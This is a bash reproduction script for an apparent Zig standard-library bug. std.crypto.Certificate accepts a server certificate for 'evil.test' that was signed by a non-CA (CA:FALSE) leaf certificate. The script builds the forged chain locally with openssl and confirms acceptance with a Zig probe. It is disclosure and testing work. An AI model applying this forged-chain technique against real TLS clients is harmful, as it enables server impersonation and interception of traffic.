#!/usr/bin/env bash
# SPDX-License-Identifier: MPL-2.0
# SPDX-FileCopyrightText: 2026 Jonathan D.A. Jewell
#
# Reproduces ziglang/zig#35877 against the installed Zig: std.crypto.Certificate
# path validation accepts a leaf signed by a non-CA (CA:FALSE) certificate.
# The Zig probe mirrors the per-certificate sequence in std/crypto/tls/Client.zig:
#   leaf.verifyHostName(host); leaf.verify(next); bundle.verify(next) (== next.verify(root)).
# Exit status: 0 = std ACCEPTED the bogus chain (defect present), 1 = rejected.
set -euo pipefail
work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT
cd "$work"

q() { "$@" >/dev/null 2>&1; }
q openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -keyout root.key -out root.pem \
  -days 30 -subj "/CN=Probe Root" -addext "basicConstraints=critical,CA:TRUE" -addext "keyUsage=critical,keyCertSign"
q openssl req -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -keyout mid.key -out mid.csr -subj "/CN=a.test"
printf 'basicConstraints=critical,CA:FALSE\nkeyUsage=critical,digitalSignature\nextendedKeyUsage=serverAuth\nsubjectAltName=DNS:a.test\n' > mid.ext
q openssl x509 -req -in mid.csr -CA root.pem -CAkey root.key -CAcreateserial -out mid.pem -days 30 -extfile mid.ext
q openssl req -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -keyout evil.key -out evil.csr -subj "/CN=evil.test"
printf 'subjectAltName=DNS:evil.test\n' > evil.ext
q openssl x509 -req -in evil.csr -CA mid.pem -CAkey mid.key -CAcreateserial -out evil.pem -days 30 -extfile evil.ext
for f in root mid evil; do openssl x509 -in "$f.pem" -outform DER -out "$f.der"; done

echo "OpenSSL: $(openssl verify -CAfile root.pem -untrusted mid.pem evil.pem 2>&1 | tr '\n' ' ')"

cat > probe.zig <<'EOF'
const std = @import("std");
const Certificate = std.crypto.Certificate;
pub fn main() !u8 {
    const root = try (Certificate{ .buffer = @embedFile("root.der"), .index = 0 }).parse();
    const mid = try (Certificate{ .buffer = @embedFile("mid.der"), .index = 0 }).parse();
    const evil = try (Certificate{ .buffer = @embedFile("evil.der"), .index = 0 }).parse();
    const now: i64 = @intCast(evil.validity.not_before + 60);
    evil.verifyHostName("evil.test") catch return 1;
    evil.verify(mid, now) catch return 1; // leaf signed by CA:FALSE cert
    mid.verify(root, now) catch return 1; // what Bundle.verify does once issuer is found
    std.debug.print("Zig {s}: std.crypto.Certificate ACCEPTED evil.test <- a.test(CA:FALSE) <- root\n", .{@import("builtin").zig_version_string});
    return 0;
}
EOF
zig run probe.zig
